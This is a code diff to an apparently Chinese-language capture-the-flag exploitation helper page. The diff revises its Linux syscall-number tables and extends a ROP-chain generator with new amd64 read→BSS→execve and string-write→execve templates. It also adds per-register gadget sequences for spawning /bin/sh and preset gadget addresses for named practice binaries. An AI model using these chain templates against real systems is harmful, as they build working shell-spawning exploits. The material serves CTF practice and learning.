@@ -90,7 +90,7 @@ pre.code{background:var(--code-bg);color:var(--code-text);border-radius:12px;pad
 .foot code{font-family:ui-monospace,monospace;background:var(--chip);padding:1px 6px;border-radius:5px}
 .toast{position:fixed;left:50%;bottom:22px;transform:translateX(-50%) translateY(20px);background:#111827;color:#fff;padding:9px 18px;border-radius:999px;font-size:13.5px;opacity:0;pointer-events:none;transition:.25s;z-index:50}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
-.seg{display:flex;border:1.5px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:12px}
+.seg{display:flex;flex-wrap:wrap;border:1.5px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:12px}
 .seg button{flex:1;padding:10px 8px;border:none;background:var(--card2);color:var(--text);font-weight:700;cursor:pointer;min-height:44px;font-size:14px;font-family:ui-monospace,monospace}
 .seg button.on{background:var(--accent);color:#fff}
 pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
@@ -143,7 +143,7 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
     </div>
     <div class="quick" id="quick"></div>
     <div id="i386Note"></div>
-    <p class="foot" id="tableNote">已按 x86-64 调用号表复核：补上了原表漏掉的 set_thread_area(205)、get_thread_area(211)（lookup_dcookie 212 之前已补）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 14 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。</p>
+    <p class="foot" id="tableNote">已按 x86-64 调用号表（syscall_64.tbl）复核：205 set_thread_area、211 get_thread_area、212 lookup_dcookie 在 amd64 上没有实现，调用只会返回 -ENOSYS，已从表中去掉（i386 上 205/211/212 是 getgroups32/getresgid32/chown32 等真实调用，243/244 才是 set/get_thread_area，不受影响）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 17 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、205 set_thread_area、211 get_thread_area、212 lookup_dcookie、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。</p>
   </div>
 
   <!-- 参数填写 -->
@@ -224,20 +224,34 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
   <!-- ROP 链 -->
   <div class="card">
     <h2>⑤ ROP 链模式（syscall） <span>选模板、填 offset 和 gadget 地址，自动拼出 flat() 链；地址要自己用 ROPgadget / ropper 量，生成的是骨架，STATIC_ONLY，回 VM 对真题跑通才算数</span></h2>
-    <label class="flabel">模板（4.1 / 4.2 是 i386 int 0x80，4.3 是 amd64 syscall）</label>
+    <label class="flabel">模板（4.1 / 4.2 是 i386 int 0x80，4.3 是 amd64 syscall；4.1a / 4.2a 是 4.1 / 4.2 的 amd64 版）</label>
     <div class="seg" role="group" aria-label="ROP 模板切换">
       <button id="ropT41" class="on">4.1 i386 read→BSS→execve</button>
       <button id="ropT42">4.2 i386 写 /bin/sh→execve</button>
       <button id="ropT43">4.3 amd64 execve</button>
+      <button id="ropT41a">4.1a amd64 read→BSS→execve</button>
+      <button id="ropT42a">4.2a amd64 写串→execve</button>
     </div>
+    <label class="flabel">输入原语（先确认再生成：链含 \x00、两次发送有时序要求，都取决于它）</label>
+    <div class="seg" role="group" aria-label="ROP 输入原语">
+      <button id="ropPrimGets">gets / strcpy 类（遇 \x00 截断）</button>
+      <button id="ropPrimReadFix">read 定长（能吃 \x00）</button>
+      <button id="ropPrimReadStream">read / recv 循环读</button>
+      <button id="ropPrimUnknown" class="on">还没确认</button>
+    </div>
+    <p class="foot" id="ropPrimNote" style="margin:0 0 4px">没确认输入原语：不知道是 gets 还是 read、定长还是不定长，生成的链可能含 \x00、两次发送可能有时序问题，先确认再跑。</p>
     <p class="foot" id="ropCond" style="margin:0 0 4px"></p>
     <div class="btn-row" style="margin:0 0 6px">
       <button class="btn btn-ghost" id="ropPreset41">填入 4.1 示例（cmcc_simplerop）</button>
       <button class="btn btn-ghost" id="ropPreset42">填入 4.2 示例（get_started_3dsctf_2016）</button>
       <button class="btn btn-ghost" id="ropPreset43">4.3 清成 0 骨架</button>
+      <button class="btn btn-ghost" id="ropPreset41a">4.1a 清成 0 骨架</button>
+      <button class="btn btn-ghost" id="ropPreset42a">4.2a 清成 0 骨架</button>
     </div>
     <div class="rop-grid">
       <div><label class="flabel" for="ropOffset">offset_to_ret（输入起点 → saved RIP 的填充数，cyclic 量）</label><input type="text" class="rop-input" id="ropOffset" value="0x20" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="ropDelay">两次发送间隔（秒，4.1 / 4.1a 用；默认 0.3，连续发在 gets/大定长读下会挂）</label><input type="text" class="rop-input" id="ropDelay" value="0.3" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42Str">要写入的字符串（4.2 / 4.2a 用；自动按 4 字节 / 8 字节分块，任意长度都行）</label><input type="text" class="rop-input" id="rop42Str" value="/bin/sh" autocomplete="off" spellcheck="false"></div>
     </div>
     <div class="rop-grid" id="ropG41">
       <div><label class="flabel" for="rop41PopEax">pop_eax_addr（pop eax; ret）</label><input type="text" class="rop-input" id="rop41PopEax" value="0x80bae06" autocomplete="off" spellcheck="false"></div>
@@ -261,12 +275,46 @@ pre.code.blocked-code{box-shadow:0 0 0 2.5px #dc2626 inset}
       <div><label class="flabel" for="rop43Syscall">syscall_addr（syscall; ret）</label><input type="text" class="rop-input" id="rop43Syscall" value="0" autocomplete="off" spellcheck="false"></div>
       <div><label class="flabel" for="rop43Binsh">binsh_addr（目标里已有的 /bin/sh 地址）</label><input type="text" class="rop-input" id="rop43Binsh" value="0" autocomplete="off" spellcheck="false"></div>
     </div>
+    <div class="rop-grid" id="ropG41a" style="display:none">
+      <div><label class="flabel" for="rop41aPopRax">pop_rax_addr（pop rax; ret）</label><input type="text" class="rop-input" id="rop41aPopRax" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aPopRdi">pop_rdi_addr（pop rdi; ret）</label><input type="text" class="rop-input" id="rop41aPopRdi" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aPopRsi">pop_rsi_addr（pop rsi; ret）</label><input type="text" class="rop-input" id="rop41aPopRsi" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aPopRdx">pop_rdx_addr（pop rdx; ret）</label><input type="text" class="rop-input" id="rop41aPopRdx" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aSyscall">syscall_addr（syscall; ret）</label><input type="text" class="rop-input" id="rop41aSyscall" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aBss">bss_addr（可写 BSS，read 和 /bin/sh 放这里）</label><input type="text" class="rop-input" id="rop41aBss" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop41aLen">read 长度（read(0, bss, len) 的 count）</label><input type="text" class="rop-input" id="rop41aLen" value="0x100" autocomplete="off" spellcheck="false"></div>
+    </div>
+    <div class="rop-grid" id="ropG42a" style="display:none">
+      <div><label class="flabel" for="rop42aBinsh">binsh_addr（写入字符串的可写 BSS 地址）</label><input type="text" class="rop-input" id="rop42aBinsh" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aPopRax">pop_rax_addr（pop rax; ret）</label><input type="text" class="rop-input" id="rop42aPopRax" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aPopRdi">pop_rdi_addr（pop rdi; ret）</label><input type="text" class="rop-input" id="rop42aPopRdi" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aMov">mov_rdi_rax（mov qword ptr [rdi], rax; ret）</label><input type="text" class="rop-input" id="rop42aMov" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aPopRsi">pop_rsi_addr（pop rsi; ret）</label><input type="text" class="rop-input" id="rop42aPopRsi" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aPopRdx">pop_rdx_addr（pop rdx; ret）</label><input type="text" class="rop-input" id="rop42aPopRdx" value="0" autocomplete="off" spellcheck="false"></div>
+      <div><label class="flabel" for="rop42aSyscall">syscall_addr（syscall; ret）</label><input type="text" class="rop-input" id="rop42aSyscall" value="0" autocomplete="off" spellcheck="false"></div>
+    </div>
     <div id="ropSteps"></div>
     <h2 style="margin-top:16px">生成的 ROP 链 <span>实时更新；pop3 的顺序是 edx→ecx→ebx，生成器已按寄存器对应排好，别再手动换算</span></h2>
     <pre class="code" id="ropCode"></pre>
     <p class="warn" id="ropWarn"></p>
     <div class="btn-row"><button class="btn btn-primary" id="ropCopyBtn">复制 ROP 链代码</button></div>
-    <p class="foot">地址从哪来：gadget 用 <code>ROPgadget --binary ./prog | grep "pop eax"</code> 或 ropper 找；offset 用 cyclic 试出来；BSS 看 <code>readelf -S ./prog</code> 的 .bss（要可写、够放 8 字节）。没有 pop3 只有单个 pop 的题，这个模板套不上，要拆成单个 pop 逐个设寄存器。</p>
+    <p class="foot">地址从哪来：gadget 用 <code>ROPgadget --binary ./prog | grep "pop eax"</code> 或 ropper 找；offset 用 cyclic 试出来；BSS 看 <code>readelf -S ./prog</code> 的 .bss（要可写、够放 8 字节）。</p>
+    <p class="foot">没有 pop3 只有单个 pop 的回退：别硬套模板，拆成单个 pop 逐个设寄存器。i386 read(0, bss, len)：pop eax;ret→3、pop ebx;ret→0、pop ecx;ret→bss、pop edx;ret→len，再 int 0x80；execve(bss, 0, 0)：pop eax;ret→11、pop ebx;ret→bss、pop ecx;ret→0、pop edx;ret→0，再 int 0x80。amd64 read(0, bss, len)：pop rax;ret→0、pop rdi;ret→0、pop rsi;ret→bss、pop rdx;ret→len，再 syscall；execve(bss, 0, 0)：pop rax;ret→59、pop rdi;ret→bss、pop rsi;ret→0、pop rdx;ret→0，再 syscall。单个 pop gadget 用 ROPgadget 按寄存器名分别找：<code>ROPgadget --binary ./prog | grep "pop rax"</code>、<code>ROPgadget --binary ./prog | grep "pop rdi"</code>、<code>ROPgadget --binary ./prog | grep "pop rsi"</code>、<code>ROPgadget --binary ./prog | grep "pop rdx"</code>。</p>
+    <p class="foot" style="margin-top:10px"><b>ROP 区核对清单（12 项，STATIC_ONLY，未经 VM 真题验证）：</b></p>
+    <ol class="foot" style="padding-left:20px;margin-top:2px">
+      <li>\x00 警告已修：生成时实算链字节数与 \x00 数并写入注释与警告区，默认预设实测 4.1 共 88 字节含 21 个 \x00、4.2 共 140 字节含 28 个 \x00（按 4.2 预设 offset=56 计；页面默认 offset 0x20 时为 116 字节、28 个 \x00），gets/strcpy 类输入会在第一个 \x00 处截断。</li>
+      <li>两次发送时序已修：4.1 / 4.1a 在两次 io.send 间插 time.sleep，间隔默认 0.3s、可在输入框改，非法输入回退 0.3s。</li>
+      <li>4.2 通用 4 字节分块已修：要写入的字符串默认 /bin/sh，自动补结尾 NUL、按 4 字节分块，任意长度都生成对应写块，默认输出与旧的两行写块逐字相同。</li>
+      <li>amd64 4.1a / 4.2a 已修：新增两个模板，地址类输入全 0 占位 + SKELETON（read 长度默认 0x100 是长度不是地址），无编造地址；4.1a 是 read→BSS→execve，4.2a 是 8 字节分块写串→execve。</li>
+      <li>单 pop 回退已补全：i386 与 amd64 逐寄存器序列均已写全（见上方回退段），不再只有一句概括。</li>
+      <li>输入原语提问已修：模板区上方四选一（gets/strcpy 类 / read 定长 / read-recv 循环读 / 还没确认，默认“还没确认”），警告与提示按选择分级。</li>
+      <li>4.2 示例地址已标注：5 个 gadget 地址（binsh 0x080eb050、pop_eax 0x080b91e6、pop3 0x0806fc30、mov 0x080557ab、int80 0x0806d7e5）由用户提供、未验证，条件行、生成代码注释、预设 toast 三处均已标注，地址值本身未动。</li>
+      <li>4.3 全 0 占位无问题：6 个输入默认全 0，生成代码含 SKELETON 占位说明，本轮未动 4.3 一字节。</li>
+      <li>已验证 ROP 逻辑无问题：pop3 弹出顺序是 edx→ecx→ebx，4.2 第二写块地址是 binsh+4，execve 均为 (path, 0, 0)，均未动。</li>
+      <li>clone 顺序无问题：i386 是 tls 第 4、child_tidptr 第 5，amd64 反着，ROP 区改动不含 clone。</li>
+      <li>白名单按名查号无问题：seccomp 白名单（第③节）本轮未动，ROP 区不含白名单改动。</li>
+      <li>其余项待补充：评审清单原文未找到（artifact 内只有构建审计、goal 目录与 live 页均无该清单），除上述 11 项外无可核实内容，待提供原文后再补——本项不编造。</li>
+    </ol>
   </div>
 
   <!-- 练习 -->
@@ -435,7 +483,6 @@ var RAW=[
 [200,"tkill","pid_t pid|int sig"],
 [201,"time","time_t *tloc"],
 [202,"futex","u32 *uaddr|int op|u32 val|const struct timespec *utime|u32 *uaddr2|u32 val3"],
-[211,"get_thread_area","struct user_desc *u_info"],
 [213,"epoll_create","int size"],
 [217,"getdents64","unsigned int fd|struct linux_dirent64 *dirent|unsigned int count"],
 [218,"set_tid_address","int *tidptr"],[219,"restart_syscall",""],
@@ -566,7 +613,6 @@ var RAW=[
 [199,"fremovexattr","int fd|const char *name"],
 [203,"sched_setaffinity","pid_t pid|unsigned int len|unsigned long *user_mask_ptr"],
 [204,"sched_getaffinity","pid_t pid|unsigned int len|unsigned long *user_mask_ptr"],
-[205,"set_thread_area","struct user_desc *u_info"],
 [206,"io_setup","unsigned nr_events|aio_context_t *ctxp"],
 [207,"io_destroy","aio_context_t ctx"],
 [208,"io_getevents","aio_context_t ctx_id|long min_nr|long nr|struct io_event *events|struct timespec *timeout"],
@@ -698,7 +744,6 @@ var RAW=[
 [470,"listns","const struct ns_id_req *req|u64 *ns_ids|size_t nr_ns_ids|unsigned int flags"],
 [471,"rseq_slice_yield",""],
 [472,"fchroot","int fd|unsigned int flags"],
-[212,"lookup_dcookie","u64 cookie64|char *buf|size_t len"]
 ];
 var REGS=["rdi","rsi","rdx","r10","r8","r9"];
 var REGNAMES=["rax","rbx","rcx","rdx","rsi","rdi","rbp","rsp","r8","r9","r10","r11","r12","r13","r14","r15","eax","ebx","ecx","edx","esi","edi","esp","ebp"];
@@ -725,13 +770,11 @@ var ARGS32 = {
  "mmap":"struct mmap_arg_struct *arg",
  "ipc":"unsigned int call|int first|unsigned long second|unsigned long third|void *ptr|long fifth",
  "_llseek":"unsigned int fd|unsigned long offset_high|unsigned long offset_low|loff_t *result|unsigned int whence",
- "_sysctl":"struct __sysctl_args *args",
  "truncate64":"const char *path|loff_t length",
  "ftruncate64":"unsigned int fd|loff_t length",
  "sendfile64":ARG64["sendfile"].join("|"),
  "set_thread_area":"struct user_desc *u_info",
  "get_thread_area":"struct user_desc *u_info",
- "lookup_dcookie":"u64 cookie64|char *buf|size_t len",
  "fadvise64_64":"int fd|loff_t offset|loff_t len|int advice",
  "ugetrlimit":ARG64["getrlimit"].join("|"),
  "stime":"time_t *tloc",
@@ -747,7 +790,14 @@ var ARGS32 = {
  "semtimedop_time64":ARG64["semtimedop"].join("|"), "rt_sigtimedwait_time64":ARG64["rt_sigtimedwait"].join("|"),
  "futex_time64":ARG64["futex"].join("|"), "sched_rr_get_interval_time64":ARG64["sched_rr_get_interval"].join("|")
 };
-var NR32 = [[0,"restart_syscall"],[1,"exit"],[2,"fork"],[3,"read"],[4,"write"],[5,"open"],[6,"close"],[7,"waitpid"],[8,"creat"],[9,"link"],[10,"unlink"],[11,"execve"],[12,"chdir"],[13,"time"],[14,"mknod"],[15,"chmod"],[16,"lchown"],[19,"lseek"],[20,"getpid"],[21,"mount"],[22,"umount"],[23,"setuid"],[24,"getuid"],[25,"stime"],[26,"ptrace"],[27,"alarm"],[29,"pause"],[30,"utime"],[33,"access"],[34,"nice"],[36,"sync"],[37,"kill"],[38,"rename"],[39,"mkdir"],[40,"rmdir"],[41,"dup"],[42,"pipe"],[43,"times"],[45,"brk"],[46,"setgid"],[47,"getgid"],[49,"geteuid"],[50,"getegid"],[51,"acct"],[52,"umount2"],[54,"ioctl"],[55,"fcntl"],[57,"setpgid"],[60,"umask"],[61,"chroot"],[62,"ustat"],[63,"dup2"],[64,"getppid"],[65,"getpgrp"],[66,"setsid"],[67,"sigaction"],[70,"setreuid"],[71,"setregid"],[72,"sigsuspend"],[73,"sigpending"],[74,"sethostname"],[75,"setrlimit"],[76,"getrlimit"],[77,"getrusage"],[78,"gettimeofday"],[79,"settimeofday"],[80,"getgroups"],[81,"setgroups"],[82,"oldselect"],[83,"symlink"],[85,"readlink"],[87,"swapon"],[88,"reboot"],[90,"mmap"],[91,"munmap"],[92,"truncate"],[93,"ftruncate"],[94,"fchmod"],[95,"fchown"],[96,"getpriority"],[97,"setpriority"],[99,"statfs"],[100,"fstatfs"],[101,"ioperm"],[102,"socketcall"],[103,"syslog"],[104,"setitimer"],[105,"getitimer"],[106,"stat"],[107,"lstat"],[108,"fstat"],[110,"iopl"],[111,"vhangup"],[114,"wait4"],[115,"swapoff"],[116,"sysinfo"],[117,"ipc"],[118,"fsync"],[119,"sigreturn"],[120,"clone"],[121,"setdomainname"],[122,"uname"],[123,"modify_ldt"],[124,"adjtimex"],[125,"mprotect"],[126,"sigprocmask"],[128,"init_module"],[129,"delete_module"],[131,"quotactl"],[132,"getpgid"],[133,"fchdir"],[135,"sysfs"],[136,"personality"],[138,"setfsuid"],[139,"setfsgid"],[140,"_llseek"],[141,"getdents"],[142,"select"],[143,"flock"],[144,"msync"],[145,"readv"],[146,"writev"],[147,"getsid"],[148,"fdatasync"],[149,"_sysctl"],[150,"mlock"],[151,"munlock"],[152,"mlockall"],[153,"munlockall"],[154,"sched_setparam"],[155,"sched_getparam"],[156,"sched_setscheduler"],[157,"sched_getscheduler"],[158,"sched_yield"],[159,"sched_get_priority_max"],[160,"sched_get_priority_min"],[161,"sched_rr_get_interval"],[162,"nanosleep"],[163,"mremap"],[164,"setresuid"],[165,"getresuid"],[168,"poll"],[170,"setresgid"],[171,"getresgid"],[172,"prctl"],[173,"rt_sigreturn"],[174,"rt_sigaction"],[175,"rt_sigprocmask"],[176,"rt_sigpending"],[177,"rt_sigtimedwait"],[178,"rt_sigqueueinfo"],[179,"rt_sigsuspend"],[180,"pread64"],[181,"pwrite64"],[182,"chown"],[183,"getcwd"],[184,"capget"],[185,"capset"],[186,"sigaltstack"],[187,"sendfile"],[190,"vfork"],[191,"ugetrlimit"],[192,"mmap2"],[193,"truncate64"],[194,"ftruncate64"],[195,"stat64"],[196,"lstat64"],[197,"fstat64"],[198,"lchown"],[199,"getuid"],[200,"getgid"],[201,"geteuid"],[202,"getegid"],[203,"setreuid"],[204,"setregid"],[205,"getgroups"],[206,"setgroups"],[207,"fchown"],[208,"setresuid"],[209,"getresuid"],[210,"setresgid"],[211,"getresgid"],[212,"chown"],[213,"setuid"],[214,"setgid"],[215,"setfsuid"],[216,"setfsgid"],[217,"pivot_root"],[218,"mincore"],[219,"madvise"],[220,"getdents64"],[221,"fcntl64"],[224,"gettid"],[225,"readahead"],[226,"setxattr"],[227,"lsetxattr"],[228,"fsetxattr"],[229,"getxattr"],[230,"lgetxattr"],[231,"fgetxattr"],[232,"listxattr"],[233,"llistxattr"],[234,"flistxattr"],[235,"removexattr"],[236,"lremovexattr"],[237,"fremovexattr"],[238,"tkill"],[239,"sendfile64"],[240,"futex"],[241,"sched_setaffinity"],[242,"sched_getaffinity"],[243,"set_thread_area"],[244,"get_thread_area"],[245,"io_setup"],[246,"io_destroy"],[247,"io_getevents"],[248,"io_submit"],[249,"io_cancel"],[250,"fadvise64"],[252,"exit_group"],[253,"lookup_dcookie"],[254,"epoll_create"],[255,"epoll_ctl"],[256,"epoll_wait"],[257,"remap_file_pages"],[258,"set_tid_address"],[259,"timer_create"],[260,"timer_settime"],[261,"timer_gettime"],[262,"timer_getoverrun"],[263,"timer_delete"],[264,"clock_settime"],[265,"clock_gettime"],[266,"clock_getres"],[267,"clock_nanosleep"],[268,"statfs64"],[269,"fstatfs64"],[270,"tgkill"],[271,"utimes"],[272,"fadvise64_64"],[274,"mbind"],[275,"get_mempolicy"],[276,"set_mempolicy"],[277,"mq_open"],[278,"mq_unlink"],[279,"mq_timedsend"],[280,"mq_timedreceive"],[281,"mq_notify"],[282,"mq_getsetattr"],[283,"kexec_load"],[284,"waitid"],[286,"add_key"],[287,"request_key"],[288,"keyctl"],[289,"ioprio_set"],[290,"ioprio_get"],[291,"inotify_init"],[292,"inotify_add_watch"],[293,"inotify_rm_watch"],[294,"migrate_pages"],[295,"openat"],[296,"mkdirat"],[297,"mknodat"],[298,"fchownat"],[299,"futimesat"],[300,"fstatat64"],[301,"unlinkat"],[302,"renameat"],[303,"linkat"],[304,"symlinkat"],[305,"readlinkat"],[306,"fchmodat"],[307,"faccessat"],[308,"pselect6"],[309,"ppoll"],[310,"unshare"],[311,"set_robust_list"],[312,"get_robust_list"],[313,"splice"],[314,"sync_file_range"],[315,"tee"],[316,"vmsplice"],[317,"move_pages"],[318,"getcpu"],[319,"epoll_pwait"],[320,"utimensat"],[321,"signalfd"],[322,"timerfd_create"],[323,"eventfd"],[324,"fallocate"],[325,"timerfd_settime"],[326,"timerfd_gettime"],[327,"signalfd4"],[328,"eventfd2"],[329,"epoll_create1"],[330,"dup3"],[331,"pipe2"],[332,"inotify_init1"],[333,"preadv"],[334,"pwritev"],[335,"rt_tgsigqueueinfo"],[336,"perf_event_open"],[337,"recvmmsg"],[338,"fanotify_init"],[339,"fanotify_mark"],[340,"prlimit64"],[341,"name_to_handle_at"],[342,"open_by_handle_at"],[343,"clock_adjtime"],[344,"syncfs"],[345,"sendmmsg"],[346,"setns"],[347,"process_vm_readv"],[348,"process_vm_writev"],[349,"kcmp"],[350,"finit_module"],[351,"sched_setattr"],[352,"sched_getattr"],[353,"renameat2"],[354,"seccomp"],[355,"getrandom"],[356,"memfd_create"],[357,"bpf"],[358,"execveat"],[359,"socket"],[360,"socketpair"],[361,"bind"],[362,"connect"],[363,"listen"],[364,"accept4"],[365,"getsockopt"],[366,"setsockopt"],[367,"getsockname"],[368,"getpeername"],[369,"sendto"],[370,"sendmsg"],[371,"recvfrom"],[372,"recvmsg"],[373,"shutdown"],[374,"userfaultfd"],[375,"membarrier"],[376,"mlock2"],[377,"copy_file_range"],[378,"preadv2"],[379,"pwritev2"],[380,"pkey_mprotect"],[381,"pkey_alloc"],[382,"pkey_free"],[383,"statx"],[384,"arch_prctl"],[385,"io_pgetevents"],[386,"rseq"],[393,"semget"],[394,"semctl"],[395,"shmget"],[396,"shmctl"],[397,"shmat"],[398,"shmdt"],[399,"msgget"],[400,"msgsnd"],[401,"msgrcv"],[402,"msgctl"],[403,"clock_gettime64"],[404,"clock_settime64"],[405,"clock_adjtime64"],[406,"clock_getres_time64"],[407,"clock_nanosleep_time64"],[408,"timer_gettime64"],[409,"timer_settime64"],[410,"timerfd_gettime64"],[411,"timerfd_settime64"],[412,"utimensat_time64"],[413,"pselect6_time64"],[414,"ppoll_time64"],[416,"io_pgetevents_time64"],[417,"recvmmsg_time64"],[418,"mq_timedsend_time64"],[419,"mq_timedreceive_time64"],[420,"semtimedop_time64"],[421,"rt_sigtimedwait_time64"],[422,"futex_time64"],[423,"sched_rr_get_interval_time64"]];
+// NR32 口径（Node 实测）：字面 380 条 = 0–386 段 350 条 + 393–423 段 30 条；
+// 0–386 段缺 37 个号：31 个历史号（19 个无实现、12 个旧 ABI）+ 222、223、251、285 共 4 个未分配 + 149、253（有名无实现、调用只返回 -ENOSYS，已删），
+// 393–423 段缺 415（未分配）；0–423 未分配空号共 11 个：222、223、251、285、387–392、415。
+// 其后 SYS64.forEach 把 ≥424 共用号 push 进来（49 条，424–472），NR32.length=429；
+// NR32_KEEP 再去重 19 个旧号（16 位版 uid/gid 等），SYS32.length=429-19=410。
+// 只改字面量时，380/49/19/410 四个数要同步改，否则注释先过期。
+// 382 是 v19 删 149 _sysctl / 253 lookup_dcookie 之前的字面数，删后 380；别拿 382 当现行数。
+var NR32 = [[0,"restart_syscall"],[1,"exit"],[2,"fork"],[3,"read"],[4,"write"],[5,"open"],[6,"close"],[7,"waitpid"],[8,"creat"],[9,"link"],[10,"unlink"],[11,"execve"],[12,"chdir"],[13,"time"],[14,"mknod"],[15,"chmod"],[16,"lchown"],[19,"lseek"],[20,"getpid"],[21,"mount"],[22,"umount"],[23,"setuid"],[24,"getuid"],[25,"stime"],[26,"ptrace"],[27,"alarm"],[29,"pause"],[30,"utime"],[33,"access"],[34,"nice"],[36,"sync"],[37,"kill"],[38,"rename"],[39,"mkdir"],[40,"rmdir"],[41,"dup"],[42,"pipe"],[43,"times"],[45,"brk"],[46,"setgid"],[47,"getgid"],[49,"geteuid"],[50,"getegid"],[51,"acct"],[52,"umount2"],[54,"ioctl"],[55,"fcntl"],[57,"setpgid"],[60,"umask"],[61,"chroot"],[62,"ustat"],[63,"dup2"],[64,"getppid"],[65,"getpgrp"],[66,"setsid"],[67,"sigaction"],[70,"setreuid"],[71,"setregid"],[72,"sigsuspend"],[73,"sigpending"],[74,"sethostname"],[75,"setrlimit"],[76,"getrlimit"],[77,"getrusage"],[78,"gettimeofday"],[79,"settimeofday"],[80,"getgroups"],[81,"setgroups"],[82,"oldselect"],[83,"symlink"],[85,"readlink"],[87,"swapon"],[88,"reboot"],[90,"mmap"],[91,"munmap"],[92,"truncate"],[93,"ftruncate"],[94,"fchmod"],[95,"fchown"],[96,"getpriority"],[97,"setpriority"],[99,"statfs"],[100,"fstatfs"],[101,"ioperm"],[102,"socketcall"],[103,"syslog"],[104,"setitimer"],[105,"getitimer"],[106,"stat"],[107,"lstat"],[108,"fstat"],[110,"iopl"],[111,"vhangup"],[114,"wait4"],[115,"swapoff"],[116,"sysinfo"],[117,"ipc"],[118,"fsync"],[119,"sigreturn"],[120,"clone"],[121,"setdomainname"],[122,"uname"],[123,"modify_ldt"],[124,"adjtimex"],[125,"mprotect"],[126,"sigprocmask"],[128,"init_module"],[129,"delete_module"],[131,"quotactl"],[132,"getpgid"],[133,"fchdir"],[135,"sysfs"],[136,"personality"],[138,"setfsuid"],[139,"setfsgid"],[140,"_llseek"],[141,"getdents"],[142,"select"],[143,"flock"],[144,"msync"],[145,"readv"],[146,"writev"],[147,"getsid"],[148,"fdatasync"],[150,"mlock"],[151,"munlock"],[152,"mlockall"],[153,"munlockall"],[154,"sched_setparam"],[155,"sched_getparam"],[156,"sched_setscheduler"],[157,"sched_getscheduler"],[158,"sched_yield"],[159,"sched_get_priority_max"],[160,"sched_get_priority_min"],[161,"sched_rr_get_interval"],[162,"nanosleep"],[163,"mremap"],[164,"setresuid"],[165,"getresuid"],[168,"poll"],[170,"setresgid"],[171,"getresgid"],[172,"prctl"],[173,"rt_sigreturn"],[174,"rt_sigaction"],[175,"rt_sigprocmask"],[176,"rt_sigpending"],[177,"rt_sigtimedwait"],[178,"rt_sigqueueinfo"],[179,"rt_sigsuspend"],[180,"pread64"],[181,"pwrite64"],[182,"chown"],[183,"getcwd"],[184,"capget"],[185,"capset"],[186,"sigaltstack"],[187,"sendfile"],[190,"vfork"],[191,"ugetrlimit"],[192,"mmap2"],[193,"truncate64"],[194,"ftruncate64"],[195,"stat64"],[196,"lstat64"],[197,"fstat64"],[198,"lchown"],[199,"getuid"],[200,"getgid"],[201,"geteuid"],[202,"getegid"],[203,"setreuid"],[204,"setregid"],[205,"getgroups"],[206,"setgroups"],[207,"fchown"],[208,"setresuid"],[209,"getresuid"],[210,"setresgid"],[211,"getresgid"],[212,"chown"],[213,"setuid"],[214,"setgid"],[215,"setfsuid"],[216,"setfsgid"],[217,"pivot_root"],[218,"mincore"],[219,"madvise"],[220,"getdents64"],[221,"fcntl64"],[224,"gettid"],[225,"readahead"],[226,"setxattr"],[227,"lsetxattr"],[228,"fsetxattr"],[229,"getxattr"],[230,"lgetxattr"],[231,"fgetxattr"],[232,"listxattr"],[233,"llistxattr"],[234,"flistxattr"],[235,"removexattr"],[236,"lremovexattr"],[237,"fremovexattr"],[238,"tkill"],[239,"sendfile64"],[240,"futex"],[241,"sched_setaffinity"],[242,"sched_getaffinity"],[243,"set_thread_area"],[244,"get_thread_area"],[245,"io_setup"],[246,"io_destroy"],[247,"io_getevents"],[248,"io_submit"],[249,"io_cancel"],[250,"fadvise64"],[252,"exit_group"],[254,"epoll_create"],[255,"epoll_ctl"],[256,"epoll_wait"],[257,"remap_file_pages"],[258,"set_tid_address"],[259,"timer_create"],[260,"timer_settime"],[261,"timer_gettime"],[262,"timer_getoverrun"],[263,"timer_delete"],[264,"clock_settime"],[265,"clock_gettime"],[266,"clock_getres"],[267,"clock_nanosleep"],[268,"statfs64"],[269,"fstatfs64"],[270,"tgkill"],[271,"utimes"],[272,"fadvise64_64"],[274,"mbind"],[275,"get_mempolicy"],[276,"set_mempolicy"],[277,"mq_open"],[278,"mq_unlink"],[279,"mq_timedsend"],[280,"mq_timedreceive"],[281,"mq_notify"],[282,"mq_getsetattr"],[283,"kexec_load"],[284,"waitid"],[286,"add_key"],[287,"request_key"],[288,"keyctl"],[289,"ioprio_set"],[290,"ioprio_get"],[291,"inotify_init"],[292,"inotify_add_watch"],[293,"inotify_rm_watch"],[294,"migrate_pages"],[295,"openat"],[296,